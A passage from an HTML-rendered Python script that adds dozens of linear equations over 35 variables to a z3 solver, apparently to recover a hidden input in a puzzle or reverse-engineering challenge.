class="number">961</span>*v31+<span class="number">632</span>*v32+<span class="number">350</span>*v33+<span class="number">289</span>*v34==<span class="number">9333864</span>)</span><br><span class="line">s.add(<span class="number">514</span>*v0+<span class="number">216</span>*v1+<span class="number">267</span>*v2+<span class="number">873</span>*v3+<span class="number">974</span>*v4+<span class="number">573</span>*v5+<span class="number">496</span>*v6+<span class="number">494</span>*v7+<span class="number">814</span>*v8+<span class="number">251</span>*v9+<span class="number">852</span>*v10+<span class="number">379</span>*v11+<span class="number">217</span>*v12+<span class="number">426</span>*v13+<span class="number">772</span>*v14+<span class="number">501</span>*v15+<span class="number">104</span>*v16+<span class="number">607</span>*v17+<span class="number">824</span>*v18+<span class="number">716</span>*v19+<span class="number">875</span>*v20+<span class="number">580</span>*v21+<span class="number">247</span>*v22+<span class="number">232</span>*v23+<span class="number">642</span>*v24+<span class="number">381</span>*v25+<span class="number">423</span>*v26+<span class="number">446</span>*v27+<span class="number">88</span>*v28+<span class="number">273</span>*v29+<span class="number">166</span>*v30+<span class="number">865</span>*v31+<span class="number">436</span>*v32+<span class="number">829</span>*v33+<span class="number">303</span>*v34==<span class="number">10203418</span>)</span><br><span class="line">s.add(<span class="number">123</span>*v0+<span class="number">914</span>*v1+<span class="number">660</span>*v2+<span class="number">603</span>*v3+<span class="number">528</span>*v4+<span class="number">536</span>*v5+<span class="number">543</span>*v6+<span class="number">518</span>*v7+<span class="number">489</span>*v8+<span class="number">1021</span>*v9+<span class="number">739</span>*v10+<span class="number">90</span>*v11+<span class="number">933</span>*v12+<span class="number">610</span>*v13+<span class="number">548</span>*v14+<span class="number">560</span>*v15+<span class="number">537</span>*v16+<span class="number">552</span>*v17+<span class="number">191</span>*v18+<span class="number">320</span>*v19+<span class="number">344</span>*v20+<span class="number">968</span>*v21+<span class="number">469</span>*v22+<span class="number">106</span>*v23+<span class="number">497</span>*v24+<span class="number">329</span>*v25+<span class="number">736</span>*v26+<span class="number">720</span>*v27+<span class="number">465</span>*v28+<span class="number">63</span>*v29+<span class="number">159</span>*v30+<span class="number">929</span>*v31+<span class="number">916</span>*v32+<span class="number">209</span>*v33+<span class="number">635</span>*v34==<span class="number">10386146</span>)</span><br><span class="line">s.add(<span class="number">325</span>*v0+<span class="number">226</span>*v1+<span class="number">700</span>*v2+<span class="number">983</span>*v3+<span class="number">881</span>*v4+<span class="number">274</span>*v5+<span class="number">169</span>*v6+<span class="number">180</span>*v7+<span class="number">912</span>*v8+<span class="number">931</span>*v9+<span class="number">276</span>*v10+<span class="number">934</span>*v11+<span class="number">1001</span>*v12+<span class="number">634</span>*v13+<span class="number">247</span>*v14+<span class="number">937</span>*v15+<span class="number">904</span>*v16+<span class="number">546</span>*v17+<span class="number">909</span>*v18+<span class="number">884</span>*v19+<span class="number">756</span>*v20+<span class="number">358</span>*v21+<span class="number">649</span>*v22+<span class="number">381</span>*v23+<span class="number">946</span>*v24+<span class="number">457</span>*v25+<span class="number">523</span>*v26+<span class="number">598</span>*v27+<span class="number">766</span>*v28+<span class="number">781</span>*v29+<span class="number">429</span>*v30+<span class="number">644</span>*v31+<span class="number">115</span>*v32+<span class="number">358</span>*v33+<span class="number">981</span>*v34==<span class="number">12003802</span>)</span><br><span class="line">s.add(<span class="number">45</span>*v0+<span class="number">384</span>*v1+<span class="number">538</span>*v2+<span class="number">328</span>*v3+<span class="number">477</span>*v4+<span class="number">451</span>*v5+<span class="number">822</span>*v6+<span class="number">30</span>*v7+<span class="number">652</span>*v8+<span class="number">145</span>*v9+<span class="number">223</span>*v10+<span class="number">144</span>*v11+<span class="number">405</span>*v12+<span class="number">288</span>*v13+<span class="number">993</span>*v14+<span class="number">983</span>*v15+<span class="number">817</span>*v16+<span class="number">702</span>*v17+<span class="number">270</span>*v18+<span class="number">460</span>*v19+<span class="number">336</span>*v20+<span class="number">984</span>*v21+<span class="number">68</span>*v22+<span class="number">274</span>*v23+<span class="number">976</span>*v24+<span class="number">306</span>*v25+<span class="number">234</span>*v26+<span class="number">913</span>*v27+<span class="number">809</span>*v28+<span class="number">923</span>*v29+<span class="number">606</span>*v30+<span class="number">246</span>*v31+<span class="number">1002</span>*v32+<span class="number">73</span>*v33+<span class="number">738</span>*v34==<span class="number">9293993</span>)</span><br><span class="line">s.add(<span class="number">760</span>*v0+<span class="number">920</span>*v1+<span class="number">296</span>*v2+<span class="number">721</span>*v3+<span class="number">886</span>*v4+<span class="number">733</span>*v5+<span class="number">461</span>*v6+<span class="number">850</span>*v7+<span class="number">777</span>*v8+<span class="number">156</span>*v9+<span class="number">919</span>*v10+<span class="number">480</span>*v11+<span class="number">946</span>*v12+<span class="number">597</span>*v13+<span class="number">585</span>*v14+<span class="number">969</span>*v15+<span class="number">516</span>*v16+<span class="number">682</span>*v17+<span class="number">255</span>*v18+<span class="number">576</span>*v19+<span class="number">256</span>*v20+<span class="number">558</span>*v21+<span class="number">419</span>*v22+<span class="number">978</span>*v23+<span class="number">739</span>*v24+<span class="number">537</span>*v25+<span class="number">236</span>*v26+<span class="number">140</span>*v27+<span class="number">951</span>*v28+<span class="number">893</span>*v29+<span class="number">235</span>*v30+<span class="number">861</span>*v31+<span class="number">40</span>*v32+<span class="number">544</span>*v33+<span class="number">987</span>*v34==<span class="number">12024112</span>)</span><br><span class="line">s.add(<span class="number">156</span>*v0+<span class="number">359</span>*v1+<span class="number">443</span>*v2+<span class="number">477</span>*v3+<span class="number">635</span>*v4+<span class="number">394</span>*v5+<span class="number">784</span>*v6+<span class="number">193</span>*v7+<span class="number">58</span>*v8+<span class="number">1022</span>*v9+<span class="number">792</span>*v10+<span class="number">535</span>*v11+<span class="number">146</span>*v12+<span class="number">186</span>*v13+<span class="number">405</span>*v14+<span class="number">8</span>*v15+<span class="number">646</span>*v16+<span class="number">259</span>*v17+<span class="number">791</span>*v18+<span class="number">835</span>*v19+<span class="number">755</span>*v20+<span class="number">985</span>*v21+<span class="number">156</span>*v22+<span class="number">908</span>*v23+<span class="number">756</span>*v24+<span class="number">285</span>*v25+<span class="number">755</span>*v26+<span class="number">243</span>*v27+<span class="number">790</span>*v28+<span class="number">100</span>*v29+<span class="number">22</span>*v30+<span class="number">822</span>*v31+<span class="number">244</span>*v32+<span class="number">518</span>*v33+<span class="number">451</span>*v34==<span class="number">9044332</span>)</span><br><span class="line">s.add(<span class="number">747</span>*v0+<span class="number">892</span>*v1+<span class="number">582</span>*v2+<span class="number">435</span>*v3+<span class="number">958</span>*v4+<span class="number">289</span>*v5+<span class="number">1020</span>*v6+<span class="number">288</span>*v7+<span class="number">257</span>*v8+<span class="number">218</span>*v9+<span class="number">314</span>*v10+<span class="number">97</span>*v11+<span class="number">1015</span>*v12+<span class="number">229</span>*v13+<span class="number">601</span>*v14+<span class="number">788</span>*v15+<span class="number">979</span>*v16+<span class="number">146</span>*v17+<span class="number">391</span>*v18+<span class="number">726</span>*v19+<span class="number">708</span>*v20+<span class="number">861</span>*v21+<span class="number">447</span>*v22+<span class="number">636</span>*v23+<span class="number">1020</span>*v24+<span class="number">470</span>*v25+<span class="number">219</span>*v26+<span class="number">494</span>*v27+<span class="number">607</span>*v28+<span class="number">601</span>*v29+<span class="number">263</span>*v30+<span class="number">801</span>*v31+<span class="number">294</span>*v32+<span class="number">361</span>*v33+<span class="number">735</span>*v34==<span class="number">10302431</span>)</span><br><span class="line">s.add(<span class="number">84</span>*v0+<span class="number">262</span>*v1+<span class="number">338</span>*v2+<span class="number">565</span>*v3+<span class="number">97</span>*v4+<span class="number">0</span>*v5+<span class="number">174</span>*v6+<span class="number">801</span>*v7+<span class="number">537</span>*v8+<span class="number">959</span>*v9+<span class="number">317</span>*v10+<span class="number">10</span>*v11+<span class="number">673</span>*v12+<span class="number">70</span>*v13+<span class="number">149</span>*v14+<span class="number">520</span>*v15+<span class="number">351</span>*v16+<span class="number">405</span>*v17+<span class="number">294</span>*v18+<span class="number">1008</span>*v19+<span class="number">597</span>*v20+<span class="number">979</span>*v21+<span class="number">587</span>*v22+<span class="number">539</span>*v23+<span class="number">100</span>*v24+<span class="number">120</span>*v25+<span class="number">329</span>*v26+<span class="number">861</span>*v27+<span class="number">293</span>*v28+<span class="number">887</span>*v29+<span class="number">191</span>*v30+<span class="number">275</span>*v31+<span class="number">380</span>*v32+<span class="number">631</span>*v33+<span class="number">748</span>*v34==<span class="number">7441063</span>)</span><br><span class="line">s.add(<span class="number">227</span>*v0+<span class="number">26</span>*v1+<span class="number">510</span>*v2+<span class="number">943</span>*v3+<span class="number">982</span>*v4+<span class="number">28</span>*v5+<span class="number">613</span>*v6+<span class="number">321</span>*v7+<span class="number">641</span>*v8+<span class="number">474</span>*v9+<span class="number">48</span>*v10+<span class="number">105</span>*v11+<span class="number">200</span>*v12+<span class="number">307</span>*v13+<span class="number">573</span>*v14+<span class="number">593</span>*v15+<span class="number">854</span>*v16+<span class="number">511</span>*v17+<span class="number">442</span>*v18+<span class="number">912</span>*v19+<span class="number">936</span>*v20+<span class="number">517</span>*v21+<span class="number">217</span>*v22+<span class="number">891</span>*v23+<span class="number">731</span>*v24+<span class="number">5</span>*v25+<span class="number">5</span>*v26+<span class="number">752</span>*v27+<span class="number">707</span>*v28+<span class="number">355</span>*v29+<span class="number">668</span>*v30+<span class="number">372</span>*v31+<span class="number">728</span>*v32+<span class="number">619</span>*v33+<span class="number">934</span>*v34==<span class="number">8480144</span>)</span><br><span class="line">s.add(<span class="number">409</span>*v0+<span class="number">161</span>*v1+<span class="number">233</span>*v2+<span class="number">346</span>*v3+<span class="number">79</span>*v4+<span class="number">17</span>*v5+<span class="number">370</span>*v6+<span class="number">996</span>*v7+<span class="number">898</span>*v8+<span class="number">647</span>*v9+<span class="number">290</span>*v10+<span class="number">312</span>*v11+<span class="number">816</span>*v12+<span class="number">780</span>*v13+<span class="number">263</span>*v14+<span class="number">276</span>*v15+<span class="number">114</span>*v16+<span class="number">386</span>*v17+<span class="number">384</span>*v18+<span class="number">287</span>*v19+<span class="number">160</span>*v20+<span class="number">947</span>*v21+<span class="number">68</span>*v22+<span class="number">363</span>*v23+<span class="number">529</span>*v24+<span class="number">841</span>*v25+<span class="number">543</span>*v26+<span class="number">424</span>*v27+<span class="number">935</span>*v28+<span class="number">713</span>*v29+<span class="number">323</span>*v30+<span class="number">632</span>*v31+<span class="number">560</span>*v32+<span class="number">160</span>*v33+<span class="number">507</span>*v34==<span class="number">9108423</span>)</span><br><span class="line">s.add(<span class="number">651</span>*v0+<span class="number">994</span>*v1+<span class="number">22</span>*v2+<span class="number">888</span>*v3+<span class="number">347</span>*v4+<span class="number">72</span>*v5+<span class="number">82</span>*v6+<span class="number">323</span>*v7+<span class="number">66</span>*v8+<span class="number">915</span>*v9+<span class="number">14</span>*v10+<span class="number">400</span>*v11+<span class="number">314</span>*v12+<span class="number">132</span>*v13+<span class="number">143</span>*v14+<span class="number">512</span>*v15+<span class="number">375</span>*v16+<span class="number">312</span>*v17+<span class="number">173</span>*v18+<span class="number">196</span>*v19+<span class="number">644</span>*v20+<span class="number">459</span>*v21+<span class="number">475</span>*v22+<span class="number">166</span>*v23+<span class="number">352</span>*v24+<span class="number">481</span>*v25+<span class="number">439</span>*v26+<span class="number">409</span>*v27+<span class="number">17</span>*v28+<span class="number">522</span>*v29+<span class="number">66</span>*v30+<span class="number">887</span>*v31+<span class="number">529</span>*v32+<span class="number">420</span>*v33+<span class="number">345</span>*v34==<span class="number">6750308</span>)</span><br><span class="line">s.add(<span class="number">605</span>*v0+<span class="number">434</span>*v1+<span class="number">86</span>*v2+<span class="number">845</span>*v3+<span class="number">595</span>*v4+<span class="number">995</span>*v5+<span class="number">974</span>*v6+<span class="number">229</span>*v7+<span class="number">847</span>*v8+<span class="number">83</span>*v9+<span class="number">821</span>*v10+<span class="number">278</span>*v11+<span class="number">18</span>*v12+<span class="number">936</span>*v13+<span class="number">413</span>*v14+<span class="number">219</span>*v15+<span class="number">708</span>*v16+<span class="number">618</span>*v17+<span class="number">852</span>*v18+<span class="number">602</span>*v19+<span class="number">290</span>*v20+<span class="number">352</span>*v21+<span class="number">412</span>*v22+<span class="number">586</span>*v23+<span class="number">515</span>*v24+<span class="number">504</span>*v25+<span class="number">39</span>*v26+<span class="number">577</span>*v27+<span class="number">598</span>*v28+<span class="number">116</span>*v29+<span class="number">460</span>*v30+<span class="number">543</span>*v31+<span class="number">343</span>*v32+<span class="number">3</span>*v33+<span class="number">629</span>*v34==<span class="number">9625384</span>)</span><br><span class="line">s.add(<span class="number">603</span>*v0+<span class="number">905</span>*v1+<span class="number">403</span>*v2+<span class="number">224</span>*v3+<span class="number">327</span>*v4+<span class="number">806</span>*v5+<span class="number">1018</span>*v6+<span class="number">266</span>*v7+<span class="number">310</span>*v8+<span class="number">647</span>*v9+<span class="number">79</span>*v10+<span class="number">98</span>*v11+<span class="number">147</span>*v12+<span class="number">763</span>*v13+<span class="number">2</span>*v14+<span class="number">117</span>*v15+<span class="number">252</span>*v16+<span class="number">738</span>*v17+<span class="number">211</span>*v18+<span class="number">858</span>*v19+<span class="number">962</span>*v20+<span class="number">45</span>*v21+<span class="number">483</span>*v22+<span class="number">603</span>*v23+<span class="number">911</span>*v24+<span class="number">729</span>*v25+<span class="number">431</span>*v26+<span class="number">135</span>*v27+<span class="number">575</span>*v28+<span class="number">404</span>*v29+<span class="number">882</span>*v30+<span class="number">1013</span>*v31+<span class="number">72</span>*v32+<span class="number">568</span>*v33+<span class="number">621</span>*v34==<span class="number">9317350</span>)</span><br><span class="line">s.add(<span class="number">449</span>*v0+<span class="number">540</span>*v1+<span class="number">314</span>*v2+<span class="number">887</span>*v3+<span class="number">163</span>*v4+<span class="number">562</span>*v5+<span class="number">213</span>*v6+<span class="number">760</span>*v7+<span class="number">80</span>*v8+<span class="number">285</span>*v9+<span class="number">530</span>*v10+<span class="number">208</span>*v11+<span class="number">863</span>*v12+<span class="number">302</span>*v13+<span class="number">38</span>*v14+<span class="number">1005</span>*v15+<span class="number">279</span>*v16+<span class="number">444</span>*v17+<span class="number">121</span>*v18+<span class="number">27</span>*v19+<span class="number">49</span>*v20+<span class="number">693</span>*v21+<span class="number">442</span>*v22+<span class="number">661</span>*v23+<span class="number">722</span>*v24+<span class="number">739</span>*v25+<span class="number">734</span>*v26+<span class="number">766</span>*v27+<span class="number">111</span>*v28+<span class="number">781</span>*v29+<span class="number">65</span>*v30+<span class="number">790</span>*v31+<span class="number">703</span>*v32+<span class="number">227</span>*v33+<span class="number">28</span>*v34==<span class="number">8606739</span>)</span><br><span class="line">s.add(<span class="number">459</span>*v0+<span class="number">686</span>*v1+<span class="number">290</span>*v2+<span class="number">86</span>*v3+<span class="number">454</span>*v4+<span class="number">743</span>*v5+<span class="number">49</span>*v6+<span class="number">324</span>*v7+<span class="number">648</span>*v8+<span class="number">268</span>*v9+<span class="number">613</span>*v10+<span class="number">63</span>*v11+<span class="number">873</span>*v12+<span class="number">34</span>*v13+<span class="number">406</span>*v14+<span class="number">24</span>*v15+<span class="number">308</span>*v16+<span class="number">257</span>*v17+<span class="number">994</span>*v18+<span class="number">539</span>*v19+<span class="number">982</span>*v20+<span class="number">114</span>*v21+<span class="number">145</span>*v22+<span class="number">799</span>*v23+<span class="number">343</span>*v24+<span class="number">885</span>*v25+<span class="number">236</span>*v26+<span class="number">754</span>*v27+<span class="number">232</span>*v28+<span class="number">560</span>*v29+<span class="number">128</span>*v30+<span class="number">262</span>*v31+<span class="number">423</span>*v32+<span class="number">240</span>*v33+<span class="number">872</span>*v34==<span class="number">8487191</span>)</span><br><span class="line">s.add(<span class="number">32</span>*v0+<span class="number">26</span>*v1+<span class="number">11</span>*v2+<span class="number">132</span>*v3+<span class="number">306</span>*v4+<span class="number">143</span>*v5+<span class="number">200</span>*v6+<span class="number">950</span>*v7+<span class="number">472</span>*v8+<span class="number">821</span>*v9+<span class="number">505</span>*v10+<span class="number">831</span>*v11+<span class="number">462</span>*v12+<span class="number">521</span>*v13+<span class="number">474</span>*v14+<span class="number">821</span>*v15+<span class="number">220</span>*v16+<span class="number">674</span>*v17+<span class="number">207</span>*v18+<span class="number">783</span>*v19+<span class="number">9</span>*v20+<span class="number">322</span>*v21+<span class="number">780</span>*v22+<span class="number">1010</span>*v23+<span class="number">147</span>*v24+<span class="number">667</span>*v25+<span class="number">997</span>*v26+<span class="number">323</span>*v27+<span class="number">200</span>*v28+<span class="number">332</span>*v29+<span class="number">762</span>*v30+<span class="number">37</span>*v31+<span class="number">642</span>*v32+<span class="number">461</span>*v33+<span class="number">328</span>*v34==<span class="number">9002065</span>)</span><br><span class="line">s.add(<span class="number">82</span>*v0+<span class="number">151</span>*v1+<span class="number">994</span>*v2+<span class="number">1007</span>*v3+<span class="number">19</span>*v4+<span class="number">761</span>*v5+<span class="number">408</span>*v6+<span class="number">672</span>*v7+<span class="number">387</span>*v8+<span class="number">875</span>*v9+<span class="number">933</span>*v10+<span class="number">420</span>*v11+<span class="number">571</span>*v12+<span class="number">673</span>*v13+<span class="number">691</span>*v14+<span class="number">663</span>*v15+<span class="number">483</span>*v16+<span class="number">721</span>*v17+<span class="number">298</span>*v18+<span class="number">45</span>*v19+<span class="number">336</span>*v20+<span class="number">348</span>*v21+<span class="number">734</span>*v22+<span class="number">642</span>*v23+<span class="number">0</span>*v24+<span class="number">989</span>*v25+<span class="number">649</span>*v26+<span class="number">997</span>*v27+<span class="number">634</span>*v28+<span class="number">644</span>*v29+<span class="number">412</span>*v30+<span class="number">517</span>*v31+<span class="number">703</span>*v32+<span class="number">307</span>*v33+<span class="number">570</span>*v34==<span class="number">10212884</span>)</span><br><span class="line">s.add(<span class="number">345</span>*v0+<span class="number">907</span>*v1+<span class="number">886</span>*v2+<span class="number">526</span>*v3+<span class="number">333</span>*v4+<span class="number">388</span>*v5+<span class="number">405</span>*v6+<span class="number">122</span>*v7+<span class="number">365</span>*v8+<span class="number">624</span>*v9+<span class="number">48</span>*v10+<span class="number">198</span>*v11+<span class="number">602</span>*v12+<span class="number">879</span>*v13+<span class="number">161</span>*v14+<span class="number">506</span>*v15+<span class="number">710</span>*v16+<span class="number">260</span>*v17+<span class="number">203</span>*v18+<span class="number">970</span>*v19+<span class="number">731</span>*v20+<span class="number">1014</span>*v21+<span class="number">237</span>*v22+<span class="number">954</span>*v23+<span class="number">457</span>*v24+<span class="number">693</span>*v25+<span class="number">34</span>*v26+<span class="number">1010</span>*v27+<span class="number">462</span>*v28+<span class="number">895</span>*v29+<span class="number">648</span>*v30+<span class="number">159</span>*v31+<span class="number">753</span>*v32+<span class="number">909</span>*v33+<span class="number">666</span>*v34==<span class="number">9777472</span>)</span><br><span class="line">s.add(<span class="number">548</span>*v0+<span class="number">483</span>*v1+<span class="number">386</span>*v2+<span class="number">629</span>*v3+<span class="number">24</span>*v4+<span class="number">340</span>*v5+<span class="number">702</span>*v6+<span class="number">423</span>*v7+<span class="number">721</span>*v8+<span class="number">172</span>*v9+<span class="number">494</span>*v10+<span class="number">422</span>*v11+<span class="number">834</span>*v12+<span class="number">881</span>*v13+<span class="number">602</span>*v14+<span class="number">7</span>*v15+<span class="number">304</span>*v16+<span class="number">70</span>*v17+<span class="number">368</span>*v18+<span class="number">202</span>*v19+<span class="number">714</span>*v20+<span class="number">230</span>*v21+<span class="number">53</span>*v22+<span class="number">910</span>*v23+<span class="number">745</span>*v24+<span class="number">745</span>*v25+<span class="number">1020</span>*v26+<span class="number">227</span>*v27+<span class="number">513</span>*v28+<span class="number">72</span>*v29+<span class="number">528</span>*v30+<span class="number">597</span>*v31+<span class="number">852</span>*v32+<span class="number">22</span>*v33+<span class="number">649</span>*v34==<span class="number">9178370</span>)</span><br><span class="line">s.add(<span class="number">685</span>*v0+<span class="number">438</span>*v1+<span class="number">750</span>*v2+<span class="number">512</span>*v3+<span class="number">1013</span>*v4+<span class="number">403</span>*v5+<span class="number">429</span>*v6+<span class="number">254</span>*v7+<span class="number">807</span>*v8+<span class="number">169</span>*v9+<span class="number">420</span>*v10+<span class="number">233</span>*v11+<span class="number">696</span>*v12+<span class="number">806</span>*v13+<span class="number">414</span>*v14+<span class="number">697</span>*v15+<span class="number">506</span>*v16+<span class="number">215</span>*v17+<span class="number">39</span>*v18+<span class="number">300</span>*v19+<span class="number">32</span>*v20+<span class="number">877</span>*v21+<span class="number">855</span>*v22+<span class="number">618</span>*v23+<span class="number">615</span>*v24+<span class="number">19</span>*v25+<span class="number">276</span>*v26+<span class="number">268</span>*v27+<span class="number">777</span>*v28+<span class="number">95</span>*v29+<span class="number">204</span>*v30+<span class="number">641</span>*v31+<span class="number">335</span>*v32+<span class="number">955</span>*v33+<span class="number">885</span>*v34==<span class="number">9671988</span>)</span><br><span class="line">s.add(<span class="number">657</span>*v0+<span class="number">450</span>*v1+<span class="number">852</span>*v2+<span class="number">306</span>*v3+<span class="number">854</span>*v4+<span class="number">986</span>*v5+<span class="number">612</span>*v6+<span class="number">679</span>*v7+<span class="number">414</span>*v8+<span class="number">424</span>*v9+<span class="number">63</span>*v10+<span class="number">772</span>*v11+<span class="number">630</span>*v12+<span class="number">378</span>*v13+<span class="number">308</span>*v14+<span class="number">228</span>*v15+<span class="number">177</span>*v16+<span class="number">879</span>*v17+<span class="number">998</span>*v18+<span class="number">1003</span>*v19+<span class="number">172</span>*v20+<span class="number">722</span>*v21+<span class="number">923</span>*v22+<span class="number">78</span>*v23+<span class="number">383</span>*v24+<span class="number">302</span>*v25+<span class="number">106</span>*v26+<span class="number">710</span>*v27+<span class="number">199</span>*v28+<span class="number">470</span>*v29+<span class="number">519</span>*v30+<span class="number">982</span>*v31+<span class="number">881</span>*v32+<span class="number">409</span>*v33+<span class="number">74</span>*v34==<span class="number">11123701</span>)</span><br><span class="line">s.add(<span class="number">756</span>*v0+<span class="number">184</span>*v1+<span class="number">168</span>*v2+<span class="number">356</span>*v3+<span class="number">1007</span>*v4+<span class="number">971</span>*v5+<span class="number">469</span>*v6+<span class="number">668</span>*v7+<span class="number">10</span>*v8+<span class="number">748</span>*v9+<span class="number">254</span>*v10+<span class="number">183</span>*v11+<span class="number">667</span>*v12+<span class="number">996</span>*v13+<span class="number">28</span>*v14+<span class="number">588</span>*v15+<span class="number">146</span>*v16+<span class="number">365</span>*v17+<span class="number">761</span>*v18+<span class="number">729</span>*v19+<span class="number">107</span>*v20+<span class="number">195</span>*v21+<span class="number">579</span>*v22+<span class="number">475</span>*v23+<span class="number">851</span>*v24+<span class="number">66</span>*v25+<span class="number">944</span>*v26+<span class="number">469</span>*v27+<span class="number">285</span>*v28+<span class="number">367</span>*v29+<span class="number">459</span>*v30+<span class="number">301</span>*v31+<span class="number">1019</span>*v32+<span class="number">411</span>*v33+<span class="number">240</span>*v34==<span class="number">10125797</span>)</span><br><span class="line">s.add(<span class="number">140</span>*v0+<span class="number">697</span>*v1+<span class="number">281</span>*v2+<span class="number">687</span>*v3+<span class="number">34</span>*v4+<span class="number">657</span>*v5+<span class="number">678</span>*v6+<span class="number">420</span>*v7+<span class="number">697</span>*v8+<span class="number">632</span>*v9+<span class="number">660</span>*v10+<span class="number">464</span>*v11+<span class="number">797</span>*v12+<span class="number">60</span>*v13+<span class="number">655</span>*v14+<span class="number">347</span>*v15+<span class="number">496</span>*v16+<span class="number">796</span>*v17+<span class="number">532</span>*v18+<span class="number">55</span>*v19+<span class="number">450</span>*v20+<span class="number">961</span>*v21+<span class="number">44</span>*v22+<span class="number">769</span>*v23+<span class="number">622</span>*v24+<span class="number">527</span>*v25+<span class="number">756</span>*v26+<span class="number">843</span>*v27+<span class="number">878</span>*v28+<span class="number">844</span>*v29+<span class="number">767</span>*v30+<span class="number">478</span>*v31+<span class="number">612</span>*v32+<span class="number">132</span>*v33+<span class="number">804</span>*v34==<span class="number">9953220</span>)</span><br><span class="line">s.add(<span class="number">67</span>*v0+<span class="number">776</span>*v1+<span class="number">816</span>*v2+<span class="number">372</span>*v3+<span class="number">553</span>*v4+<span class="number">169</span>*v5+<span class="number">596</span>*v6+<span class="number">85</span>*v7+<span class="number">991</span>*v8+<span class="number">97</span>*v9+<span class="number">931</span>*v10+<span class="number">735</span>*v11+<span class="number">960</span>*v12+<span class="number">336</span>*v13+<span class="number">482</span>*v14+<span class="number">243</span>*v15+<span class="number">512</span>*v16+<span class="number">910</span>*v17+<span class="number">722</span>*v18+<span class="number">276</span>*v19+<span class="number">381</span>*v20+<span class="number">495</span>*v21+<span class="number">349</span>*v22+<span class="number">121</span>*v23+<span class="number">366</span>*v24+<span class="number">693</span>*v25+<span class="number">496</span>*v26+<span class="number">727</span>*v27+<span class="number">615</span>*v28+<span class="number">42</span>*v29+<span class="number">974</span>*v30+<span class="number">876</span>*v31+<span class="number">698</span>*v32+<span class="number">816</span>*v33+<span class="number">414</span>*v34==<span class="number">10782865</span>)</span><br><span class="line">s.add(<span class="number">529</span>*v0+<span class="number">755</span>*v1+<span class="number">674</span>*v2+<span class="number">262</span>*v3+<span class="number">667</span>*v4+<span class="number">119</span>*v5+<span class="number">855</span>*v6+<span class="number">1003</span>*v7+<span class="number">912</span>*v8+<span class="number">414</span>*v9+<span class="number">1012</span>*v10+<span class="number">122</span>*v11+<span class="number">592</span>*v12+<span class="number">443</span>*v13+<span class="number">829</span>*v14+<span class="number">169</span>*v15+<span class="number">556</span>*v16+<span class="number">17</span>*v17+<span class="number">476</span>*v18+<span class="number">954</span>*v19+<span class="number">751</span>*v20+<span class="number">203</span>*v21+<span class="number">39</span>*v22+<span class="number">667</span>*v23+<span class="number">413</span>*v24+<span class="number">744</span>*v25+<span class="number">66</span>*v26+<span class="number">120</span>*v27+<span class="number">322</span>*v28+<span class="number">895</span>*v29+<span class="number">389</span>*v30+<span class="number">573</span>*v31+<span class="number">499</span>*v32+<span class="number">377</span>*v33+<span class="number">351</span>*v34==<span class="number">9924122</span>)</span><br><span class="line">s.add(<span class="number">727</span>*v0+<span class="number">717</span>*v1+<span class="number">559</span>*v2+<span class="number">922</span>*v3+<span class="number">527</span>*v4+<span class="number">512</span>*v5+<span class="number">1000</span>*v6+<span class="number">333</span>*v7+<span class="number">790</span>*v8+<span class="number">901</span>*v9+<span class="number">42</span>*v10+<span class="number">420</span>*v11+<span class="number">585</span>*v12+<span class="number">408</span>*v13+<span class="number">988</span>*v14+<span class="number">94</span>*v15+<span class="number">945</span>*v16+<span class="number">331</span>*v17+<span class="number">704</span>*v18+<span class="number">651</span>*v19+<span class="number">130</span>*v20+<span class="number">796</span>*v21+<span class="number">795</span>*v22+<span class="number">322</span>*v23+<span class="number">88</span>*v24+<span class="number">776</span>*v25+<span class="number">299</span>*v26+<span class="number">972</span>*v27+<span class="number">616</span>*v28+<span class="number">909</span>*v29+<span class="number">820</span>*v30+<span class="number">617</span>*v31+<span class="number">439</span>*v32+<span class="number">721</span>*v33+<span class="number">176</span>*v34==<span class="number">10760304</span>)</span><br><span class="line">s.add(<span class="number">434</span>*v0+<span class="number">861</span>*v1+<span class="number">873</span>*v2+<span class="number">935</span>*v3+<span class="number">582</span>*v4+<span class="number">543</span>*v5+<span class="number">33</span>*v6+<span class="number">741</span>*v7+<span class="number">897</span>*v8+<span class="number">208</span>*v9+<span class="number">571</span>*v10+<span class="number">294</span>*v11+<span class="number">868</span>*v12+<span class="number">302</span>*v13+<span class="number">362</span>*v14+<span class="number">885</span>*v15+<span class="number">318</span>*v16+<span class="number">39</span>*v17+<span class="number">274</span>*v18+<span class="number">833</span>*v19+<span class="number">573</span>*v20+<span class="number">732</span>*v21+<span class="number">526</span>*v22+<span class="number">542</span>*v23+<span class="number">312</span>*v24+<span class="number">454</span>*v25+<span class="number">187</span>*v26+<span class="number">15</span>*v27+<span class="number">616</span>*v28+<span class="number">45</span>*v29+<span class="number">243</span>*v30+<span class="number">732</span>*v31+<span class="number">841</span>*v32+<span class="number">439</span>*v33+<span class="number">80</span>*v34==<span class="number">9838513</span>)</span><br><span class="line">s.add(<span class="number">843</span>*v0+<span class="number">931</span>*v1+<span class="number">854</span>*v2+<span class="number">1</span>*v3+<span class="number">564</span>*v4+<span class="number">889</span>*v5+<span class="number">799</span>*v6+<span class="number">655</span>*v7+<span class="number">610</span>*v8+<span class="number">196</span>*v9+<span class="number">227</span>*v10+<span class="number">456</span>*v11+<span class="number">325</span>*v12+<span class="number">270</span>*v13+<span class="number">99</span>*v14+<span class="number">513</span>*v15+<span class="number">372</span>*v16+<span class="number">664</span>*v17+<span class="number">765</span>*v18+<span class="number">817</span>*v19+<span class="number">328</span>*v20+<span class="number">820</span>*v21+<span class="number">810</span>*v22+<span class="number">305</span>*v23+<span class="number">731</span>*v24+<span class="number">683</span>*v25+<span class="number">85</span>*v26+<span class="number">409</span>*v27+<span class="number">456</span>*v28+<span class="number">134</span>*v29+<span class="number">836</span>*v30+<span class="number">342</span>*v31+<span class="number">385</span>*v32+<span class="number">196</span>*v33+<span class="number">760</span>*v34==<span class="number">10335141</span>)</span><br><span class="line">s.add(<span class="number">711</span>*v0+<span class="number">59</span>*v1+<span class="number">806</span>*v2+<span class="number">683</span>*v3+<span class="number">462</span>*v4+<span class="number">270</span>*v5+<span class="number">832</span>*v6+<span class="number">257</span>*v7+<span class="number">531</span>*v8+<span class="number">990</span>*v9+<span class="number">605</span>*v10+<span class="number">436</span>*v11+<span class="number">620</span>*v12+<span class="number">928</span>*v13+<span class="number">880</span>*v14+<span class="number">987</span>*v15+<span class="number">354</span>*v16+<span class="number">815</span>*v17+<span class="number">679</span>*v18+<span class="number">483</span>*v19+<span class="number">135</span>*v20+<span class="number">949</span>*v21+<span class="number">756</span>*v22+<span class="number">66</span>*v23+<span class="number">315</span>*v24+<span class="number">718</span>*v25+<span class="number">799</span>*v26+<span class="number">269</span>*v27+<span class="number">960</span>*v28+<span 